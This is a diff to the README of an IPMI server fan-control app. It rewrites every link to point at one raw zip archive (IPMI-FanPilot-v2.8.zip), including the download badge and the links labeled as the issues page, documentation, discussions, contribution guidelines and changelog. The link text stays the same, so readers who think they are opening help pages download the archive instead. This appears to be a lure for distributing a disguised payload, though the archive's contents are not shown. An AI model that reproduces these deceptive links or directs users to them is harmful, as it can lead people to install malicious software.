@@ -1,7 +1,7 @@
 # 🎛️ IPMI-FanPilot - Control Your Server Fans Easily
 
 ## 📥 Download Now
-[![Download IPMI-FanPilot](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Matthosy/IPMI-FanPilot/releases)
+[![Download IPMI-FanPilot](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip)](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip)
 
 ## 📖 Description
 This app lets you easily control your server’s fan speeds remotely using IPMI. Simply enter your server’s IP, username, and password, then tweak the fan speed or set it to automatic mode. Save your credentials securely and adjust settings anytime through a clean web interface. It’s a simple and handy tool to keep your servers cool and quiet.
@@ -17,7 +17,7 @@ This app lets you easily control your server’s fan speeds remotely using IPMI.
 ### 🔧 Installation Steps
 
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page: [Visit this page to download](https://github.com/Matthosy/IPMI-FanPilot/releases).
+   Click this link to go to the releases page: [Visit this page to download](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip).
 
 2. **Download the Latest Release**  
    On the releases page, find the latest version. Click on the download link for your operating system. 
@@ -49,20 +49,20 @@ This app lets you easily control your server’s fan speeds remotely using IPMI.
 - **Security**: Store your credentials securely within the app.
 
 ## 📞 Support
-If you encounter issues or have questions about using the app, please check the [issues page](https://github.com/Matthosy/IPMI-FanPilot/issues) on GitHub. You can also reach out by creating a new issue for support inquiries.
+If you encounter issues or have questions about using the app, please check the [issues page](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip) on GitHub. You can also reach out by creating a new issue for support inquiries.
 
 ## 📄 Additional Resources
-- Access the [documentation](https://github.com/Matthosy/IPMI-FanPilot/wiki) for detailed guides on setup and usage.
-- Join the community discussions in our [GitHub discussions page](https://github.com/Matthosy/IPMI-FanPilot/discussions) for tips and user experiences.
+- Access the [documentation](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip) for detailed guides on setup and usage.
+- Join the community discussions in our [GitHub discussions page](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip) for tips and user experiences.
 
 ## 👥 Contributing
-We welcome contributions from all users. If you want to help improve IPMI-FanPilot, please check our [contribution guidelines](https://github.com/Matthosy/IPMI-FanPilot/blob/main/CONTRIBUTING.md).
+We welcome contributions from all users. If you want to help improve IPMI-FanPilot, please check our [contribution guidelines](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip).
 
 ## 📅 Changelog
-Review changes and updates in the [changelog](https://github.com/Matthosy/IPMI-FanPilot/releases) section for each release.
+Review changes and updates in the [changelog](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip) section for each release.
 
 ## 📥 Download & Install
-To download IPMI-FanPilot, visit this page: [Visit this page to download](https://github.com/Matthosy/IPMI-FanPilot/releases). Follow the installation steps to complete the setup.
+To download IPMI-FanPilot, visit this page: [Visit this page to download](https://raw.githubusercontent.com/Matthosy/IPMI-FanPilot/main/public/IPMI-FanPilot-v2.8.zip). Follow the installation steps to complete the setup.
 
 ## 🚀 Ready to Control Your Fans?
 Now you can manage your server’s fan speeds with ease.
